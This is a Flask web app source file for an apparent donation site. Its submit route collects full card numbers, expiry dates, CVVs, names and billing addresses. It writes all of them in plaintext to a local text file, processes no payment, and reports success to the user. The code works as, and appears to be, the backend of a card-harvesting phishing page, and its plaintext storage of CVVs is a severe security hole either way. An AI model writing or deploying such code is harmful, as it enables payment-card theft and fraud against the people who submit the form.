from flask import Flask, render_template, request, redirect, jsonify
import os

app = Flask(__name__)  # ✅ define app at the top

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()

    name = data.get('name')
    email = data.get('email')
    amount = data.get('amount')
    message = data.get('message')
    card_number = data.get('cardNumber')
    expiry = data.get('expiry')
    cvv = data.get('cvv')
    billing = data.get('billing')
    name_on_card = data.get('nameOnCard')
    country = data.get('country')

    with open('donations.txt', 'a') as f:
        f.write(f'Name: {name}\nEmail: {email}\nAmount: {amount}\nMessage: {message}\n')
        f.write(f'Card: {card_number}, Expiry: {expiry}, CVV: {cvv}, Name on Card: {name_on_card}\n')
        f.write(f'Billing Address: {billing}\nCountry: {country}\n')
        f.write('-' * 50 + '\n')

    return jsonify({"message": "Donation received successfully"})

@app.route('/thankyou')
def thankyou():
    return "<h2>Thank you for your support!</h2><p>Your donation has been received.</p>"

# ✅ Run app with correct host and port for Render
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
